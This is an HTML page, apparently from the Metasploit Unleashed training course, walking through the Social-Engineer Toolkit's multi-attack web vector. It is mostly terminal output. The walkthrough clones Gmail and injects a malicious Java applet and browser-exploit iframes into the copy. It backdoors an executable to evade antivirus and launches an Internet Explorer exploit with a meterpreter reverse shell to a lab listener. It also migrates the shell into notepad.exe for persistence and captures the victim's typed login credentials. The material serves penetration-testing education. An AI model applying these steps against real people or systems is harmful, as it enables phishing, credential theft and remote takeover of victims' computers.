<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Multi-Attack Web Vector</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Multi-Attack
Web Vector</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">The multi-attack web vector is new to
0.7 and will allow you to
specify multiple web attack methods in order to perform a single
attack. In some scenarios, the Java Applet may fail however an Internet
Explorer exploit would be successful. Or maybe the Java Applet and the
Internet Explorer exploit fail and the credential harvester is
successful. The multi-attack vector allows you to turn on and off
different vectors and combine the attacks all into one specific
webpage. So when the user clicks the link he will be targeted by each
of the attack vectors you specify. One thing to note with the attack
vector is that you can&#8217;t utilize Tabnabbing, Cred Harvester, or Web
Jacking with the Man Left in the Middle attack. Based on the attack
vectors they shouldn&#8217;t be combined anyway. Let&#8217;s take a look at the
multi attack vector. In this scenario we're going to turn on the Java
Applet attack, Metasploit Client-Side exploit, and the Web Jacking
attack. When the victim browses the site, he/she will need to click on
the link and will be bombarded with credential harvester, Metasploit
exploits, and the java applet attack. We're going to intentionally
select an Internet Explorer 7 exploit and browse the page using IE6
just to demonstrate that if one technique fails, we have other methods.
<br>
<br>
</p>
<pre id="code">1. The Java Applet Attack Method<br>2. The Metasploit Browser Exploit Method<br>3. Credential Harvester Attack Method<br>4. Tabnabbing Attack Method<br>5. Man Left in the Middle Attack Method<br>6. Web Jacking Attack Method<br>7. Multi-Attack Web Method<br>8. Return to the previous menu<br><br>Enter your choice (press enter for default): 7<br><br><br>The first method will allow SET to import a list of pre-defined<br>web applications that it can utilize within the attack.<br><br>The second method will completely clone a website of your choosing<br>and allow you to utilize the attack vectors within the completely<br>same web application you were attempting to clone.<br><br>The third method allows you to import your own website, note that you<br>should only have an index.html when using the import website<br>functionality.<br><br>[!] Website Attack Vectors [!]<br><br>1. Web Templates<br>2. Site Cloner<br>3. Custom Import<br>4. Return to main menu<br><br>Enter number (1-4): 2<br><br>SET supports both HTTP and HTTPS<br>Example: http://www.thisisafakesite.com<br>Enter the url to clone: https://gmail.com<br><br>[*************************************************************]<br><br>                Multi-Attack Web Attack Vector<br><br>[*************************************************************]<br><br> The multi attack vector utilizes each combination of attacks<br> and allow the user to choose the method for the attack. Once<br> you select one of the attacks, it will be added to your<br> attack profile to be used to stage the attack vector. When<br> your finished be sure to select the 'Im finished' option.<br><br>Select which attacks you want to use:<br><br>1. The Java Applet Attack Method (OFF)<br>2. The Metasploit Browser Exploit Method (OFF)<br>3. Credential Harvester Attack Method (OFF)<br>4. Tabnabbing Attack Method (OFF)<br>5. Man Left in the Middle Attack Method (OFF)<br>6. Web Jacking Attack Method (OFF)<br>7. Use them all - A.K.A. 'Tactical Nuke'<br>8. I'm finished and want proceed with the attack.<br>9. Return to main menu.<br><br>Enter your choice one at a time (hit 8 or enter to launch): 1<br><br>Turning the Java Applet Attack Vector to ON<br><br>Option added. Press {return} to add or prepare your next attack.<br><br>[*************************************************************]<br><br>                Multi-Attack Web Attack Vector<br><br>[*************************************************************]<br><br> The multi attack vector utilizes each combination of attacks<br> and allow the user to choose the method for the attack. Once<br> you select one of the attacks, it will be added to your<br> attack profile to be used to stage the attack vector. When<br> your finished be sure to select the 'Im finished' option.<br><br>Select which attacks you want to use:<br><br>1. The Java Applet Attack Method (ON)<br>2. The Metasploit Browser Exploit Method (OFF)<br>3. Credential Harvester Attack Method (OFF)<br>4. Tabnabbing Attack Method (OFF)<br>5. Man Left in the Middle Attack Method (OFF)<br>6. Web Jacking Attack Method (OFF)<br>7. Use them all - A.K.A. 'Tactical Nuke'<br>8. I'm finished and want proceed with the attack.<br>9. Return to main menu.<br><br>Enter your choice one at a time (hit 8 or enter to launch): 2<br><br>Turning the Metasploit Client Side Attack Vector to ON<br><br>Option added. Press {return} to add or prepare your next attack.<br><br>[*************************************************************]<br><br>                Multi-Attack Web Attack Vector<br><br>[*************************************************************]<br><br> The multi attack vector utilizes each combination of attacks<br> and allow the user to choose the method for the attack. Once<br> you select one of the attacks, it will be added to your<br> attack profile to be used to stage the attack vector. When<br> your finished be sure to select the 'Im finished' option.<br><br>Select which attacks you want to use:<br><br>1. The Java Applet Attack Method (ON)<br>2. The Metasploit Browser Exploit Method (ON)<br>3. Credential Harvester Attack Method (OFF)<br>4. Tabnabbing Attack Method (OFF)<br>5. Man Left in the Middle Attack Method (OFF)<br>6. Web Jacking Attack Method (OFF)<br>7. Use them all - A.K.A. 'Tactical Nuke'<br>8. I'm finished and want proceed with the attack.<br>9. Return to main menu.<br><br>Enter your choice one at a time (hit 8 or enter to launch): 6<br><br>Turning the Web Jacking Attack Vector to ON<br><br>Option added. Press {return} to add or prepare your next attack.<br><br>[*************************************************************]<br><br>                Multi-Attack Web Attack Vector<br><br>[*************************************************************]<br><br> The multi attack vector utilizes each combination of attacks<br> and allow the user to choose the method for the attack. Once<br> you select one of the attacks, it will be added to your<br> attack profile to be used to stage the attack vector. When<br> your finished be sure to select the 'Im finished' option.<br><br>Select which attacks you want to use:<br><br>1. The Java Applet Attack Method (ON)<br>2. The Metasploit Browser Exploit Method (ON)<br>3. Credential Harvester Attack Method (ON)<br>4. Tabnabbing Attack Method (OFF)<br>5. Man Left in the Middle Attack Method (OFF)<br>6. Web Jacking Attack Method (ON)<br>7. Use them all - A.K.A. 'Tactical Nuke'<br>8. I'm finished and want proceed with the attack.<br>9. Return to main menu.<br><br>Enter your choice one at a time (hit 8 or enter to launch):</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Conversely, you can use the
&#8220;Tactical Nuke&#8221; option which is option
7 that will enable all of the attack vectors automatically for you. In
this example, you can see the flags change and the Java Applet,
Metasploit Browser Exploit, Credential Harvester, and Web Jacking
attack methods have all been enabled. In order to proceed hit enter or
use option 8.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">Enter your choice one at a time (hit 8 or enter to launch):<br>What payload do you want to generate:<br><br>Name:                                      Description:<br><br>1. Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker.<br>2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker.<br>3. Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker.<br>4. Windows Bind Shell                      Execute payload and create an accepting port on remote system.<br>5. Windows Bind Shell X64                  Windows x64 Command Shell, Bind TCP Inline<br>6. Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline<br>7. Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter<br>8. Windows Meterpreter Egress Buster       Spawn a meterpreter shell and find a port home via multiple ports<br>9. Import your own executable              Specify a path for your own executable<br><br>Enter choice (hit enter for default):<br><br>Below is a list of encodings to try and bypass AV.<br><br>Select one of the below, 'backdoored executable' is typically the best.<br><br>1. avoid_utf8_tolower (Normal)<br>2. shikata_ga_nai (Very Good)<br>3. alpha_mixed (Normal)<br>4. alpha_upper (Normal)<br>5. call4_dword_xor (Normal)<br>6. countdown (Normal)<br>7. fnstenv_mov (Normal)<br>8. jmp_call_additive (Normal)<br>9. nonalpha (Normal)<br>10. nonupper (Normal)<br>11. unicode_mixed (Normal)<br>12. unicode_upper (Normal)<br>13. alpha2 (Normal)<br>14. No Encoding (None)<br>15. Multi-Encoder (Excellent)<br>16. Backdoored Executable (BEST)<br><br>Enter your choice (enter for default):<br>[-] Enter the PORT of the listener (enter for default):<br><br>[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...<br>[-] Backdoor completed successfully. Payload is now hidden within a legit executable.<br><br>********************************************************<br>Do you want to create a Linux/OSX reverse_tcp payload<br>in the Java Applet attack as well?<br>********************************************************<br><br>Enter choice yes or no: no<br><br>Enter the browser exploit you would like to use<br>1.  Internet Explorer CSS Tags Memory Corruption<br>2.  Sun Java Runtime New Plugin docbase Buffer Overflow<br>3.  Microsoft Windows WebDAV Application DLL Hijacker<br>4.  Adobe Shockwave rcsL Memory Corruption Exploit<br>5.  Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow<br>6.  Apple QuickTime 7.6.7 _Marshaled_pUnk Code Execution<br>7.  Microsoft Help Center XSS and Command Execution (MS10-042)<br>8.  Microsoft Internet Explorer iepeers.dll Use After Free (MS10-018)<br>9.  Microsoft Internet Explorer Tabular Data Control Exploit (MS10-018)<br>10.  Microsoft Internet Explorer "Aurora" Memory Corruption (MS10-002)<br>11. Microsoft Internet Explorer 7 Uninitialized Memory Corruption (MS09-002)<br>12. Microsoft Internet Explorer Style getElementsbyTagName Corruption (MS09-072)<br>13. Microsoft Internet Explorer isComponentInstalled Overflow<br>14. Microsoft Internet Explorer Explorer Data Binding Corruption (MS08-078)<br>15. Microsoft Internet Explorer Unsafe Scripting Misconfiguration<br>16. FireFox 3.5 escape Return Value Memory Corruption<br>17. Metasploit Browser Autopwn (USE AT OWN RISK!)<br><br>Enter your choice (1-12) (enter for default): 8<br><br>[*] Cloning the website: https://gmail.com<br>[*] This could take a little bit...<br>[*] Injecting Java Applet attack into the newly cloned website.<br>[*] Filename obfuscation complete. Payload name is: x5sKAzS<br>[*] Malicious java applet website prepped for deployment<br><br>[*] Injecting iframes into cloned website for MSF Attack....<br>[*] Malicious iframe injection successful...crafting payload.<br><br><br>[*] Launching MSF Listener...<br>[*] This may take a few to load MSF...<br>[-] ***<br>[-] * WARNING: No database support: String User Disabled Database Support<br>[-] ***<br><br>                 o                       8         o   o<br>                 8                       8             8<br>ooYoYo. .oPYo.  o8P .oPYo. .oPYo. .oPYo. 8 .oPYo. o8  o8P<br>8' 8  8 8oooo8   8  .oooo8 Yb..   8    8 8 8    8  8   8<br>8  8  8 8.       8  8    8   'Yb. 8    8 8 8    8  8   8<br>8  8  8 `Yooo'   8  `YooP8 `YooP' 8YooP' 8 `YooP'  8   8<br>..:..:..:.....:::..::.....::.....:8.....:..:.....::..::..:<br>::::::::::::::::::::::::::::::::::8:::::::::::::::::::::::<br>::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<br><br><br>       =[ metasploit v3.4.2-dev [core:3.4 api:1.0]<br>+ -- --=[ 588 exploits - 300 auxiliary<br>+ -- --=[ 224 payloads - 27 encoders - 8 nops<br>       =[ svn r10268 updated today (2010.09.09)<br><br>resource (src/program_junk/meta_config)&gt; use windows/browser/ms09_002_memory_corruption<br>resource (src/program_junk/meta_config)&gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>resource (src/program_junk/meta_config)&gt; set LHOST 172.16.32.129<br>LHOST =&gt; 172.16.32.129<br>resource (src/program_junk/meta_config)&gt; set LPORT 443<br>LPORT =&gt; 443<br>resource (src/program_junk/meta_config)&gt; set URIPATH /<br>URIPATH =&gt; /<br>resource (src/program_junk/meta_config)&gt; set SRVPORT 8080<br>SRVPORT =&gt; 8080<br>resource (src/program_junk/meta_config)&gt; set ExitOnSession false<br>ExitOnSession =&gt; false<br>resource (src/program_junk/meta_config)&gt; exploit -j<br>[*] Exploit running as background job.<br>msf exploit(ms09_002_memory_corruption) &gt;<br>[*] Started reverse handler on 172.16.32.129:443<br>[*] Using URL: http://0.0.0.0:8080/<br>[*]  Local IP: http://172.16.32.129:8080/<br>[*] Server started.</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that we have everything running,
lets browse to the website and
see what&#8217;s there. We first get greeted with the site has been moved&#8230;
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:SET_09.png"
 class="image"><img alt="SET 09.png"
 src="http://www.offensive-security.com/w/images/6/6e/SET_09.png"
 width="1440" height="729"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
We click the link and we are hit with a Metasploit exploit, look at the
handler on the backend.
<br>
<br>
</p>
<pre id="code">[*] Sending Internet Explorer 7 CFunctionPointer Uninitialized Memory Corruption to 172.16.32.131:1329...<br><br>msf exploit(ms09_002_memory_corruption) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">This exploit fails because we are
using Internet Explorer 6 but once this fails, check out the victims
screen:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:SET_10.png"
 class="image"><img alt="SET 10.png"
 src="http://www.offensive-security.com/w/images/e/e9/SET_10.png"
 width="1440" height="729"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
We hit run, and we have a meterpreter shell. In this instance we
would be redirected back to the original Google page because the attack
was successful. You will also notice that when using the Java Applet,
we automatically migrate to a separate thread (process) and it happens
to be notepad.exe. The reason for this being that if the victim closes
the browser, we will be safe and the process won&#8217;t terminate our
meterpreter shell.
<br>
<br>
</p>
<pre id="code">[*] Sending stage (748544 bytes) to 172.16.32.131<br>[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1333) at Thu Sep 09 12:33:20 -0400 2010<br>[*] Session ID 1 (172.16.32.129:443 -&gt; 172.16.32.131:1333) processing InitialAutoRunScript 'migrate -f'<br>[*] Current server process: java.exe (824)<br>[*] Spawning a notepad.exe host process...<br>[*] Migrating into process ID 3044<br>[*] New server process: notepad.exe (3044)<br>msf exploit(ms09_002_memory_corruption) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Let&#8217;s say that this attack failed
and the user hit cancel. He would
then be prompted to enter his/her username and password into the
username/password field.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">[*] WE GOT A HIT! Printing the output:<br>PARAM: ltmpl=default<br>PARAM: ltmplcache=2<br>PARAM: continue=https://mail.google.com/mail/?ui=html<br>PARAM: zy=l<br>PARAM: service=mail<br>PARAM: rm=false<br>PARAM: dsh=-8578216484479049837<br>PARAM: ltmpl=default<br>PARAM: ltmpl=default<br>PARAM: scc=1<br>PARAM: ss=1<br>PARAM: timeStmp=<br>PARAM: secTok=<br>PARAM: GALX=fYQL_bXkbzU<br>POSSIBLE USERNAME FIELD FOUND: Email=thisismyusername<br>POSSIBLE PASSWORD FIELD FOUND: Passwd=thisismypassword<br>PARAM: rmShown=1<br>PARAM: signIn=Sign+in<br>PARAM: asts=<br>[*] WHEN YOUR FINISHED. HIT CONTROL-C TO GENERATE A REPORT</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/SET"
 title="SET">SET</a></div>
</body>
</html>
